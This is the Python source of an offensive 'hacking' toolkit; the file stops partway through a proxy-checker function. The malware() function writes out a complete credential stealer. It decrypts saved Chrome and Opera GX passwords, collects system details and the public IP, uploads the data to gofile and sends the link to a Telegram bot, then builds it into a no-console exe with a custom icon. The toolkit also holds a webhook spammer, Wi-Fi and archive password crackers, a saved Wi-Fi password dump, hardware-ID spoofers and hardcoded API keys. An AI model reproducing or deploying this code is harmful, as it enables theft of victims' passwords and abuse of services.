import hashlib
import itertools
import os
import platform
import random
import re
import shutil
import socket
import string
import subprocess
import threading
import time
import tkinter as tk
import webbrowser
from datetime import datetime
from threading import Thread
from time import sleep
from tkinter import *
from tkinter import messagebox
from zipfile import ZipFile, is_zipfile
import _tkinter
import cloudscraper
import folium
import ipinfo
import phonenumbers
import psutil
import pywifi
import pyzipper
import requests
import sys
from colorama import Fore
from opencage.geocoder import OpenCageGeocode
from phonenumbers import geocoder, timezone, carrier
from pywifi import const
from pytools.proxy_scraper import SCRAPER
from pytools.pythonic_way_proxy_checker import HttpProxyChecker, Socks4ProxyChecker, Socks5ProxyChecker
from urllib.parse import urlparse
from colorama import Fore, init
from bs4 import BeautifulSoup
import patoolib

def check_update():
    with cloudscraper.create_scraper() as s:
        response = s.get('https://raw.githubusercontent.com/Apkaless/Apkaless/main/ver')
        res = int(response.text.strip())
        if res != cversion:
            msg = messagebox.askyesno('Update Available', 'Would You Like To Visit Update Page?')
            if msg == True:
                webbrowser.open('https://github.com/Apkaless/Apkaless/tree/main')
                

def phoneNumberTracker(phoneNumber):
    os.system('cls')
    os.chdir(tool_parent_dir)
    try:
        phone_number_parsed = phonenumbers.parse(phoneNumber)

        print(f'{green}[+] Attempting to track location of:{white} {phonenumbers.format_number(phone_number_parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}...')

        print(f'{green}[+] Time Zone ID:{white} {timezone.time_zones_for_number(phone_number_parsed)}')

        location = geocoder.description_for_number(phone_number_parsed, 'en')

        if location:
            print(f'{green}[+] Region:{white} {location}')
        else:
            print(f'{green}[+] Region:{white} Unknown')

        if carrier.name_for_number(phone_number_parsed, 'en'):
            print(f'{green}[+] Service Provider:{white} {carrier.name_for_number(phone_number_parsed, 'en')}')
        else:
            print(f'{red}[-] Service Provider: Unknown')

        coder = OpenCageGeocode('42c84373c47e490ba410d4132ae64fc4')

        results = coder.geocode(location)

        lat = results[0]['geometry']['lat']
        lng = results[0]['geometry']['lng']
        currency = results[2]['annotations']['currency']['name']
        currency_symbol = results[2]['annotations']['currency']['symbol']
        address = coder.reverse_geocode(lat, lng)

        print(f'{green}[+] Lat:{white} {lat}')
        print(f'{green}[+] Long:{white} {lng}')
        print(f'{green}[+] Currency:{white} {currency}')
        print(f'{green}[+] Currency Symbol:{white} {currency_symbol}')
        if address:
            print(f'{green}[+] Approximate Location is:{white} {address[0]['formatted']}')
        else:
            print(f'{red}[-] No Address Found For The Given Coordinates.')

        my_map = folium.Map(location=[lat, lng], zoom_start=9)

        # Add a marker to the map at the specified latitude and longitude with a popup displaying the 'location' variable.
        folium.Marker([lat, lng], popup=location).add_to(my_map)

        ''' Clean the phone number and use it to generate a file name with an '.html' extension
        we'll basically save each map with the number of the owner for easy identification.'''

        file_name = f"{phoneNumber}.html"

        # Save the map as an HTML file with the generated file name.
        my_map.save(file_name)

        # Print a message indicating where the saved HTML file can be found.
        print(f"{green}[+] See Aerial Coverage at:{white} {os.path.abspath(file_name)}")

    except:
        pass


def webhookSpammer():
    os.system('cls')
    try:

        print(f'{red}[*] Note: {white}if you wanna stop the attack just press {blue}(ctrl + C){rescolor}\n')

        url = input(f'\n{green}[+] WebHook URL:{white} ')

        content = input(f'\n{green}[+] {white}What Would You Like To Send {blue}(ex: Hello):{white} ')

        username = input(f'\n{green}[+] Type Any Name:{white} ')

        data = {
            'content': content,
            'username': username
        }

        os.system('cls')

        while True:

            res = requests.post(url, json=data)

            try:
                res.raise_for_status()

            except requests.exceptions.HTTPError:
                print(f'{green}[+] waiting to unblock your ip...')
                time.sleep(10)

            else:
                print("Payload delivered successfully, code {}.".format(res.status_code))

            time.sleep(0.05)  # 50ms

    except:
        main()


def wifiPassword():
    os.system('cls')

    all_ssid = []

    res = subprocess.check_output('netsh wlan show profile', shell=True).decode()

    users = res.splitlines()

    for profile in users:

        if 'All User Profile' in profile:
            ssid = profile.strip().split(':')[1].strip()

            all_ssid.append(ssid)

    for ssid in all_ssid:

        res = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', shell=True).decode()

        data = res.strip().splitlines()

        for key in data:

            if 'Key Content' in key:
                print(
                    f'\n{green}[+] SSID:{white} {ssid}\n{green}[+] Password:{white} {key.strip().split(':')[1].strip()}')


def nmapCommands():
    os.system('cls')
    print('''

All You Need To Know About How To Use Nmap To Scan Your Target

By Apkaless

Instagram: Apkaless

====================================================================

================
|Basic Scanning|
================

nmap -F -A --open [target] | -F: Fast Scan, -A: enable OS Detection and Version Scanning, --open: only open ports will be displayed

nmap -iL [filename.txt]

nmap -iR [number of random ip]

nmap [target] --exclude [target]

nmap [target] --excludefile [filename.txt]

nmap --top-ports [number of ports ex: 10] [target]

nmap -PN [target] scan the host even if its down

nmap -sP [target] ping scan, only displays up hosts

=======================================================

===================
|Advanced Scanning|
===================

nmap -sS [target],  syn stealth scan

nmap -sT [target], TCP Scan

nmap -sU [target], UDP Scan

nmap -sX [target], trying to get response from a system being protected by a firewall

nmap -sA [target]

nmap -sO [target], ip protocol scan

nmap --send-eth [target], sends eth packets

nmap --send-ip [target], sends ip packets
''')


def wordlist():
    os.system('cls')
    os.chdir(tool_parent_dir)
    min_len = int(input(f'\n{green}[+] Min Length:{rescolor} '))

    max_len = int(input(f'\n{green}[+] Max Length:{rescolor} '))

    passwords_chars = input(f'\n{green}[+] What are the chars you want (ex: abc1234):{rescolor} ')

    filename = input(f'\n{green}[+] Type The Filename:{rescolor} ')

    gen_password = []

    try:
        os.mkdir('wordlist')
    except:
        pass

    os.chdir('wordlist')

    with open(filename + '.txt', 'a') as f:
        print(f'{yellow}\n[!] Press {white}ctrl + c {yellow}To Stop Generator !')
        try:

            for plen in range(min_len, max_len + 1):

                passwords = itertools.product(passwords_chars, repeat=plen)

                for password in passwords:
                    full_password = ''.join(password)
                    f.writelines([full_password, '\n'])
                    gen_password.append(full_password)
        except:
            pass

        finally:
            wordlistpath = os.path.abspath(filename + '.txt')
            os.system('cls')
            os.chdir(tool_parent_dir)
            print(f'''{blue}

|===============|          
|     status    |
|===============|

{green}[+] Min Length:{white} {min_len}
{green}[+] Max Length:{white} {max_len}
{green}[+] Chars Selected:{white} {passwords_chars}
{green}[+] Words Generated:{white} {len(gen_password)}
{green}[+] Wordlist Path:{white} {wordlistpath}
''')


def malware(botToken, cid, malname, malico):
    os.system('cls')
    os.chdir(tool_parent_dir)
    code = r"""
import shutil
import os
import json
import base64
import time
from telebot import TeleBot
import win32crypt
import sqlite3
from Crypto.Cipher import AES
import colorama
import requests
import subprocess

def get_pc_name_and_public_ip():

        pc_name = os.getlogin()

        ip = subprocess.check_output('curl -s ifconfig.me/ip', shell=True).decode()

        cpu = subprocess.check_output('wmic cpu get name', shell=True).decode().strip().split('\n')[1]

        gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().strip().split('\n')[1]

        with open('passwords_google_database.txt', 'a') as f:

            f.writelines(['*'*50, '\n', f'PC Name: {pc_name}', '\n', f'CPU: {cpu}', '\n', f'GPU: {gpu}', '\n', f'Public IP: {ip}', '\n' , '*'*50, '\n\n'])

            f.close() 

def send_email(download_link):

    token = '%s'

    chat_id = %s

    url = f'https://api.telegram.org/bot{token}/SendMessage?chat_id={chat_id}&text={download_link}'

    requests.get(url)

def upload_file(file):

    res = subprocess.check_output('curl -s https://api.gofile.io/servers', shell=True).decode()

    jsdata = json.loads(res)

    server = jsdata['data']

    server = server['servers'][0]['name']

    res = subprocess.check_output(f'curl -s -F file=@{file} https://{server}.gofile.io/contents/uploadfile', shell=True).decode()

    jsdata = json.loads(res)

    download_link = jsdata['data']['downloadPage']

    send_email(download_link)

class Chrome:

    def __init__(self) -> None:
        pass

    def get_encrypt_key(self):

        local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State'))


        with open(local, 'r') as f:

            jsdata = json.loads(f.read())


        return jsdata['os_crypt']['encrypted_key']


    def decode_encrypted_key(self, encrypted_key):

        return base64.b64decode(encrypted_key)


    def decrypt_decoded_key(self, decoded_key):

        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]

    def decrypt_saved_password(self, password, key):

        try:

            iv = password[3:15]

            password = password[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()

        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return


class Opera:

    def __init__(self) -> None:
        pass

    def get_encrypt_key(self):

        local = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Local State'))


        with open(local, 'r') as f:

            jsdata = json.loads(f.read())


        return jsdata['os_crypt']['encrypted_key']


    def decode_encrypted_key(self, encrypted_key):

        return base64.b64decode(encrypted_key)


    def decrypt_decoded_key(self, decoded_key):

        return win32crypt.CryptUnprotectData(decoded_key, None, None, None, 0)[1]

    def decrypt_saved_password(self, password, key):

        try:

            iv = password[3:15]

            password = password[15:]

            cipher = AES.new(key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()

        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return

def chrome():

    try:

        chrome = Chrome()

        encrypted_key = chrome.get_encrypt_key()

        decoded_key = chrome.decode_encrypted_key(encrypted_key)[5:]

        decrypted_key = chrome.decrypt_decoded_key(decoded_key)

        db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'))

        filename = 'ChromeData.db'

        shutil.copyfile(db, filename)

        database = sqlite3.connect(filename)

        if database:


            cursor = database.cursor()

            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

            for row in cursor.fetchall():
                print('='*40)

                origin_url = row[0]
                action_url = row[1]
                user_or_email = row[2]
                password = row[3]
                password = chrome.decrypt_saved_password(password, decrypted_key)

                print('*'*50)

                result =f'''
    {colorama.Fore.GREEN}[!] Browser: {colorama.Fore.RESET}Google Chrome
    {colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
    {colorama.Fore.GREEN}[+] Action Url: {colorama.Fore.RESET}{action_url}
    {colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
    {colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
                        '''

                print(result)
                print('*'*50)

                with open('passwords_google_database.txt', 'a') as f:
                    f.writelines([f'[+] Browser: Google Chrome\n[+] Origin Url: {origin_url}', '\n', f'[+] Action Url: {action_url}', '\n', f'[+] Username: {user_or_email}', '\n', f'[+] Password: {password}', '\n','='*40, '\n\n'])

        database.close()           
        os.remove('ChromeData.db')

    except:
        pass

def opera():

    try:

        opera = Opera()

        encrypted_key = opera.get_encrypt_key()

        decoded_key = opera.decode_encrypted_key(encrypted_key)[5:]

        decrypted_key = opera.decrypt_decoded_key(decoded_key)

        db = os.path.join(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Login Data'))

        filename = 'OperaData.db'

        shutil.copyfile(db, filename)

        database = sqlite3.connect(filename)

        if database:


            cursor = database.cursor()

            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

            for row in cursor.fetchall():
                print('='*40)

                origin_url = row[0]
                action_url = row[1]
                user_or_email = row[2]
                password = row[3]
                password = opera.decrypt_saved_password(password, decrypted_key)

                print('*'*50)

                result =f'''
    {colorama.Fore.GREEN}[!] Browser: {colorama.Fore.RESET}Opera GX
    {colorama.Fore.GREEN}[+] Origin Url: {colorama.Fore.RESET}{origin_url}
    {colorama.Fore.GREEN}[+] Action Url: {colorama.Fore.RESET}{action_url}
    {colorama.Fore.GREEN}[+] Username: {colorama.Fore.RESET}{user_or_email}
    {colorama.Fore.GREEN}[+] Password: {colorama.Fore.RESET}{password}
                        '''

                print(result)
                print('*'*50)

                with open('passwords_google_database.txt', 'a') as f:
                    f.writelines([f'[+] Browser: Opera GX\n[+] Origin Url: {origin_url}', '\n', f'[+] Action Url: {action_url}', '\n', f'[+] Username: {user_or_email}', '\n', f'[+] Password: {password}', '\n','='*40, '\n\n'])

        database.close()           
        os.remove('OperaData.db')
    except:
        pass

def main():

    print('\n================= Chrome =================\n\n')

    chrome()

    print('\n================= Opera =================\n\n')
    opera()

if __name__ == '__main__':

    userprofile = os.path.join(os.environ['USERPROFILE'])
    os.chdir(userprofile)
    colorama.init(convert=True)
    get_pc_name_and_public_ip()
    main()
    upload_file('passwords_google_database.txt')
    os.remove('passwords_google_database.txt')

""" % (str(botToken), cid)

    with open(malname + '.py', 'w') as f:
        f.writelines([code])
        f.close()

    py2exe(malname + '.py', malico)


def py2exe(fpath, icpath):
    os.chdir(tool_parent_dir)
    try:
        # loop to check if python installed or not, if not then install it right now and break the loop
        while True:
            os.system('cls')
            try:
                subprocess.check_output('python --version', shell=True).decode()
            except:
                # python is not installed, try to install it now with curl
                subprocess.check_output(
                    'curl -s https://www.python.org/ftp/python/3.13.1/python-3.13.1-amd64.exe --output python64launcher.exe',
                    shell=True)
                subprocess.check_output('start python64launcher.exe -s')
                time.sleep(3)
                continue
            else:
                break

        # loop to check if pyinstaller installed or not, if not then install it right now and break the loop
        while True:
            os.system('cls')
            try:
                subprocess.check_output('pyinstaller --version', shell=True).decode()
            except:
                # pyinstaller is not installed, try to install it now
                os.system('cls')
                print('Installing PyInstaller ...')
                subprocess.check_output('pip install pyinstaller', shell=True).decode()
                time.sleep(3)
                continue

            else:
                break

        # loop to check if pillow installed or not, if not then install it right now and break the loop
        while True:
            os.system('cls')
            subprocess.check_output('pip install -q pillow', shell=True).decode()
            time.sleep(3)
            break
        os.system('cls')

        subprocess.check_output(f'pyinstaller --onefile {fpath} --icon {icpath} --noconsole', shell=True)

    except KeyboardInterrupt:
        main()
    except subprocess.CalledProcessError:
        print(f'\n{red}[!] Something went wrong.')
        time.sleep(3)
        main()

    else:
        os.system('cls')
        os.chdir('dist')
        for file in os.listdir():
            print(f'{green}[+] ExE Path:{white} {os.path.abspath(file)}')
        os.chdir(tool_parent_dir)
        split_py = fpath.split('.')[0]
        spec = split_py + '.spec'
        shutil.rmtree('build')
        os.remove(fpath)
        os.remove(spec)


def public_ip():
    os.system('cls')
    ip = subprocess.check_output('curl -s ifconfig.me/ip', shell=True).decode().strip()
    return ip


def sysinfo():
    os.system('cls')

    cpu = subprocess.check_output('wmic cpu get name', shell=True).decode().strip().split('\n')[1]
    gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().strip().split('\n')[
        1]
    memlist = subprocess.check_output('wmic memorychip get devicelocator, manufacturer, speed, DataWidth',
                                      shell=True).decode().strip().split('\n')
    bios = subprocess.check_output('wmic bios get name, Version, SoftwareElementID, SerialNumber, Manufacturer',
                                   shell=True).decode()
    mb = subprocess.check_output('wmic baseboard get Manufacturer, product, Version', shell=True).decode()

    print(f'\n{green}===================> {white}CPU & GPU{green} <===================={white}\n')

    print(f'{green}[+] CPU:{white} ', cpu)

    print(f'\n{green}[+] GPU:{white} ', gpu)

    print(f'\n{green}===================> {white}Memory{green} <===================={white}\n')

    for mem in memlist:
        print(mem)

    print(f'\n{green}===================> {white}BIOS{green} <===================={white}\n')

    print(bios)

    print(f'{green}===================> {white}MotherBoard{green} <===================={white}\n')

    print(mb)


def zipfilecracker(zipf, passwordsList):
    os.system('cls')
    # init zipfile object
    os.chdir(tool_parent_dir)
    if is_zipfile(zipf):
        zf = ZipFile(zipf)
        with open(passwordsList, 'rb') as pwdf:  # open file cotains passwords
            pwdsList = pwdf.readlines()  # read all file lines and store them into list
            for pwd in pwdsList:  # iterate through list
                password = pwd.strip()
                try:
                    zf.extractall(pwd=password)  # try to extract the zipped file with the given password
                except NotImplementedError:  # is the zipped file was encrypted by zipcrypto instead of AES256
                    try:
                        aesf = pyzipper.AESZipFile(zipf)
                        aesf.extractall(pwd=password)
                    except:
                        print(f'\n{red}[-] Password Error:{white} {password.decode()}')
                    else:
                        print(f'\n{green}[+] Password Found:{white} {password.decode()}')
                        break


def ip_lookup(ip):
    os.system('cls')
    latitudeandlatitude = []
    resolve_ip = socket.gethostbyname(ip)
    try:
        accessToken = '58950d8a1c1383'
        handler = ipinfo.getHandler(accessToken)
        details = handler.getDetails(resolve_ip)
        for key, value in details.all.items():
            print(f'{green}[+] {key}:{white} {value}')
            if key == 'latitude' or key == 'longitude':
                latitudeandlatitude.append(value)
    except:
        print(f'\n{red}[-] Invalid IP Address:{white} {resolve_ip}')
    else:
        try:
            print(f'{green}[+] DNS Record: {white}{socket.gethostbyaddr(resolve_ip)[0]}')
        except Exception as error:
            print(str(error))
            pass
        try:
            latitude, longitude = tuple(latitudeandlatitude)
            ip_geolocation = f'https://www.google.com/maps/search/?api=1&query={latitude},{longitude}'
            webbrowser.open(ip_geolocation)
        except Exception as err:
            print(str(err))
            pass


def hash_cracker(hashtocrack, pwds, hash_type):
    os.system('cls')
    supported_hashes = {

        1: hashlib.sha256,
        2: hashlib.sha1,
        3: hashlib.sha224,
        4: hashlib.sha384,
        5: hashlib.sha512,
        6: hashlib.md5
    }

    if hash_type in supported_hashes:
        hash_to_crack = hashtocrack
        hashtype = supported_hashes[hash_type]
        hashCaptured = False
        try:
            with open(pwds, 'r') as f:
                pwd = f.readlines()
                for passwd in pwd:

                    testing_hash = hashtype(passwd.encode()).hexdigest()
                    if testing_hash == hash_to_crack:
                        print(f'{green}[+] Hash Has Been Cracked:{white} {passwd}')
                        hashCaptured = True
                        break
                    else:
                        print(f'{yellow}[!] Trying With:{white} {passwd}')
                        continue
                else:
                    print(f'\n{green}[+] {white}Process Has Been Finished')
        except OSError:
            os.system('cls')
            print(f'\n{red}[-] The Passwords List Not Found, Please Make Sure You Have The Correct Path.')
        finally:
            if hashCaptured:
                try:
                    os.chdir(tool_parent_dir)
                    try:
                        os.mkdir('Hash_Cracker')
                    except FileExistsError:
                        os.chdir('Hash_Cracker')
                    else:
                        os.chdir('Hash_Cracker')
                    with open('hash_cracker.txt', 'a') as hashfile:
                        hashfile.writelines([f'Hash: {hash_to_crack}\nCracked Hash: {passwd}', '\n\n'])
                        hashfile.close()
                except Exception as e:
                    print(f'{red}[-] Error Details: {white}{e}')
                else:
                    print(f'\n{green}[+] Hash Saved Into: {white}{os.path.abspath('hash_cracker.txt')}')
            else:
                return False
    else:
        print(f'\n{red}[-] {white}Hash Type Isn\'t Supported !')
        time.sleep(3)


def sevenz_cracker(sevenzfile, passlist):
    os.system('cls')
    if sevenzfile.endswith('.7z'):
        with open(passlist, 'r') as f:
            passwords = f.readlines()
            for password in passwords:
                passwd = password.strip()
                try:
                    patoolib.extract_archive(file=sevenzfile, password=passwd)
                except:
                    print(f'{red}[-] Error Password: {white}{passwd}')
                    continue
                else:
                    print(f'\n{green}[+] Password Found: {white}{passwd}')
    else:
        print(f'{red}\n[-] The File Is Not a 7z File')
        time.sleep(3)


def get_hwid():
    mac_address = []
    for interface, address in psutil.net_if_addrs().items():
        for addr in address:
            if addr.family == psutil.AF_LINK:
                mac_address.append(addr.address)
    else:
        hostname = socket.gethostname()
        unhashed_hwid = f'{hostname}' + ''.join(mac_address)
        hashed_hwid = hashlib.md5(unhashed_hwid.encode('ascii')).hexdigest()
        return hashed_hwid


def crack_wifi(dictionary):
    os.system('cls')
    with open(dictionary, 'r') as f:
        try:
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
        except:
            print(f'{red}\n[-] No WIFI Interface Detected.')
            time.sleep(3)
            main()

        iface.scan()
        for i in range(5):
            print(f'\r{green}[+] Scanning All Wifi In Range, Waiting {white}({str(4 - i)})', end='')
            time.sleep(1)
        print('\n')
        os.system('cls')
        bssids = iface.scan_results()
        wifi_names_signals = []
        for bssid in bssids:
            wifi_names = (bssid.signal + 100, bssid.ssid)
            wifi_names_signals.append(wifi_names)
        wifi_names_signals = sorted(wifi_names_signals, reverse=True)
        id = 0
        print('-' * 30)
        while id < len(wifi_names_signals):
            print('{:<8d}{:<8d}{}'.format(id, wifi_names_signals[id][0], wifi_names_signals[id][1]))
            id += 1
        print('-' * 30)

        while True:
            wifi_id = int(input(f'\n{yellow}[!] Please Select Wifi ID You Wanna Crack:{white} '))
            wifi_to_crack = wifi_names_signals[wifi_id][1]
            confirmation = input(
                f'\n{yellow}[!] Is This The Wifi Name {white}{wifi_to_crack} {yellow}You Wanna Crack {white}(Y/N): ')
            confirmation = confirmation.lower()
            if confirmation == 'y' or confirmation == 'yes':
                break
            else:
                continue
        os.system('cls')
        iface.disconnect()
        while iface.status() == 4:
            pass

        print(f'\r{green}[+] Wi-Fi Interface Disconnected', end='')

        for pwd in f:

            pwd = pwd.strip('\n')
            profile = pywifi.Profile()
            profile.ssid = wifi_to_crack
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pwd
            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < 1:
                os.system('cls')
                if iface.status() == 4:
                    print(
                        f'\r{green}[+] Connected To {white}{wifi_to_crack} {green}With Password: [{white}{pwd}{green}] {yellow}    ',end='  ')
                    input(
                        f'{yellow}\n[!] Hit Enter To Save The Password Into {white}{wifi_to_crack}.txt {yellow}and Back To Main Menu')
                    with open(f'{wifi_to_crack}.txt', 'a') as filedata:
                        filedata.writelines(['-' * 38, f'\nWi-Fi: {wifi_to_crack}\nPassword: {pwd}\n', '-' * 38])
                        filedata.close()
                    main()
                else:
                    print(f'{yellow}[!] Trying To Connect To {white}{wifi_to_crack} {yellow}With Password: {white}{pwd}')


def restart_adapter(adapters):
    for adapter in adapters:
        try:

            subprocess.check_output(f'netsh interface set interface {adapter} admin=disable', shell=True,
                                    text=True, stderr=subprocess.PIPE)
            subprocess.check_output(f'netsh interface set interface {adapter} admin=enable', shell=True,
                                    text=True, stderr=subprocess.PIPE)
            time.sleep(5)
        except Exception as e:
            print(e)
            input('')
    return None


def machineID_spoofer():
    os.system('cls')

    dev_ids = ['DEV_0008', 'DEV_27ba', 'DEV_27bb', 'DEV_27fa', 'DEV_008', 'DEV_009', 'DEV_0018', 'DEV_0019', 'DEV_0020',
               'DEV_0028', 'DEV_0029', 'DEV_002a', 'DEV_002b', 'DEV_002c', 'DEV_002d', 'DEV_10de002e', 'DEV_1545002f']

    def spoof_display_id():

        new_display_id = ''.join(random.choice(string.ascii_uppercase) for _ in range(3)) + ''.join(
            random.choice(string.digits) for _ in range(4))
        new_display_id = fr'MONITOR\{new_display_id}'
        reg_key = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\DISPLAY'
        display = subprocess.check_output(f'reg query {reg_key}', text=True, stderr=subprocess.PIPE)
        display_list = display.strip().split('\n')
        for display in display_list:
            query = subprocess.check_output(f'reg query {display}', text=True, stderr=subprocess.PIPE)
            classInstances = query.strip().split('\n')
            for classInstance in classInstances:
                query = subprocess.check_output(
                    f'reg add {classInstance} /v HardwareID /t REG_MULTI_SZ /d {new_display_id} /f',
                    text=True, stderr=subprocess.PIPE)
                if 'The operation completed successfully.' in query:
                    print(f'\n{green}[+] Display ID Spoofed Successfully !')
                else:
                    print(f'\n{red}[-] Display ID Spoofed Failed !')

    def spoof_gpu():

        base_key = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\PCI'
        pnp_did = subprocess.check_output('wmic path Win32_VideoController get PNPDeviceID', shell=True,text=True, stderr=subprocess.PIPE)
        pnp_did = pnp_did.strip().split('PCI')[1]
        full_key = base_key + pnp_did
        query = subprocess.check_output(f'reg query {full_key}', shell=True, text=True, stderr=subprocess.PIPE)
        q = query.strip().split('\n')
        print(q)
        # for _ in q:
        #     if 'HardwareID' in _:
        #         data = _.strip().split()
        #         hardware_ids = data[-1]
        #         new_hardware_id = hardware_ids.split('\\')
        #         did = new_hardware_id[1].split('&')
        #         for _ in did:
        #             if 'DEV' in _:
        #                 current_did = _.strip()
        #                 new_hardware_id = hardware_ids.replace(current_did, random.choice(dev_ids))
        #                 try:
        #                     spoof = subprocess.check_output(f'reg add {full_key} /v HardwareID /t REG_MULTI_SZ /d {new_hardware_id} /f',
        #                                                     text=True, stderr=subprocess.PIPE)

        #                     if 'The operation completed successfully.' in spoof:
        #                         print(f'\n{green}[+] GPU Spoofed Successfully !')
        #                 except:
        #                     print("Couldn't Spoof GPU !,  Try Again !")


    def generate_machine_id(lenghts):
        letters = string.ascii_letters + string.digits
        machine_id = '-'.join(''.join(random.choice(letters) for _ in range(length)) for length in lenghts)
        machine_id = '{%s}' % machine_id
        return machine_id

    def set_registry_keys(registry_keys):
        statue = None
        for key, value in registry_keys.items():
            try:
                res = subprocess.check_output(
                    f'reg add {key} /v {value["name"]} /t REG_SZ /d {value["value"]} /f',
                    shell=True, text=True, stderr=subprocess.PIPE)
                if 'The operation completed successfully.' in res:
                    print(f'\n{green}[+] {value["name"]} Spoofed Successfully !')
                    statue = True
                else:
                    statue = False
            except Exception as e:
                if 'ProductId' in str(e):
                    print(f'\n{red}[!] Couldn\'t Spoof ProductId !')
                    statue = True
                elif 'HwProfileGuid' in str(e):
                    print(f'\n{red}[!] Couldn\'t Spoof HwProfileGuid !')
                    statue = True

                else:
                    statue = False

        return statue

    registry_keys = {
        r'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SQMClient': {"name": "MachineId",
                                                             "value": generate_machine_id([8, 4, 4, 4, 12]).lower()},
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography": {"name": "MachineGuid",
                                                                "value": generate_machine_id([8, 4, 4, 4, 12]).lower()},
        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion": {"name": "ProductId",
                                                                             "value": generate_machine_id(
                                                                                 [5, 5, 5, 5])},
        r'"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"': {
            "name": "HwProfileGuid",
            "value": generate_machine_id([8, 4, 4, 4, 12]).lower()}
    }

    if set_registry_keys(registry_keys):
        spoof_display_id()
        spoof_gpu()
        os.chdir(path_to_assistfolder)
        os.chdir('tools')
        os.chdir('hwids')
        mainfile = os.listdir()[0]
        subprocess.check_output(f'start {mainfile}', shell=True)
        return True

    else:
        return False


def hwid_spoofer():
    connected_interfaces = []
    current_mac_address = {}
    connected_adapters = []
    transports = []
    active_interfaces = []
    letters = 'abcdefghijklmn1234567890'
    new_mac_address = 'DE' + ''.join(random.choice(letters) for _ in range(10))
    new_mac_address = new_mac_address.upper()

    # Grab The Connected Interfaces on this os
    for interface in psutil.net_if_addrs():
        if interface == 'Ethernet0' or interface == 'Ethernet' or interface == 'Wi-Fi':
            address = psutil.net_if_addrs()[interface]
            for addr in address:
                if addr.family == psutil.AF_LINK:  # store mac address of each connected interface
                    current_mac_address[interface] = addr.address

            connected_interfaces.append(interface)

    for conn in connected_interfaces:
        mac_address = current_mac_address[conn]

    result = subprocess.check_output(['getmac'], text=True, stderr=subprocess.PIPE).strip().splitlines()[2:]

    for mac_adress in current_mac_address:
        mac_addr = current_mac_address[mac_adress]
        for adapter in result:
            if mac_addr in adapter:
                connected_adapters.append(adapter.strip())

    for trans in connected_adapters:
        transport = trans.split('_')[1]
        transports.append(transport)

    success = False
    n = 0
    iterate = True

    while iterate:
        try:
            if n >= 10:
                interface = r'HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\00' + str(n)
            else:
                interface = r'HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\000' + str(n)
            query = subprocess.check_output(f'reg query {interface}', text=True, stderr=subprocess.PIPE)
            for trans in transports:
                if trans in query:
                    transports.remove(trans)
                    active_interfaces.append(interface)
            n += 1
        except:
            break

    for active_interface in active_interfaces:
        spoof = subprocess.check_output(f'reg add {active_interface} /v NetworkAddress /d {new_mac_address} /f',
                                        text=True, stderr=subprocess.PIPE)
        if 'The operation completed successfully.' in spoof:
            restart_adapter(connected_interfaces)
            success = True
        else:
            success = False
    return success


def proxy_gen():
    global a, b, new
    from threading import Thread
    os.system('cls')
    os.chdir(tool_parent_dir)
    threads = []
    p1 = Thread(target=SCRAPER().proxy_1)
    p2 = Thread(target=SCRAPER().proxy_2)
    p3 = Thread(target=SCRAPER().proxyScraper)
    p4 = Thread(target=SCRAPER().proxyScraper_2)
    p1.start()
    threads.append(p1)
    time.sleep(1)
    p2.start()
    threads.append(p2)
    time.sleep(1)
    p3.start()
    threads.append(p3)
    time.sleep(3)
    p4.start()
    threads.append(p4)
    time.sleep(4)

    for thread in threads:  # this simply tells python interpreter wait to finish all the threads then continue Execute
        # The Code
        thread.join()
    try:
        proxies = SCRAPER().proxies
        b = len(proxies)
        new = [prx for prx in dict.fromkeys(proxies)]
        a = len(new)
    except:
        pass

    for proxy in new:
        with open('scraped_proxies.txt', 'a') as file:
            file.writelines([proxy, '\n'])
            file.close()
    print(
        f'\n{green}[+] Total Proxies: {white}{b}\n{green}[+]{red} {b - a} Duplicated Proxies {green}Has Been Removed.\n{green}[+] Saved Into: {white}Scraped_proxies.txt')


def proxy_check(prx_list):
    os.system('cls')
    os.chdir(tool_parent_dir)

    def save_working(proxy, type):

        with open(f'{type}.txt', 'a') as f:
            f.writelines([proxy, '\n'])
            f.close()

    def check(proxy):

        http_prx = HttpProxyChecker(proxy, 10).start_checker()
